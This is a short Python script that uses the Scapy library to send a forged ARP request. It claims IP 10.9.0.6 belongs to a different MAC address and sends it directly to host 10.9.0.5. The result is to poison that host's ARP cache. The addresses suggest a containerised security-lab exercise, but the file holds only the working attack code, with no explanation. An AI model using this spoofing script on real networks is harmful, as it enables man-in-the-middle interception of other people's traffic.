#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()

# assume we already know about A's MAC,
# then we directly unicast
E.dst = '02:42:0a:09:00:05'

# 1 for ARP request
# 2 for ARP reply
A.op = 1
A.hwsrc = '02:42:0a:09:00:69'
A.psrc = '10.9.0.6'
A.pdst = '10.9.0.5'

pkt = E/A
sendp(pkt)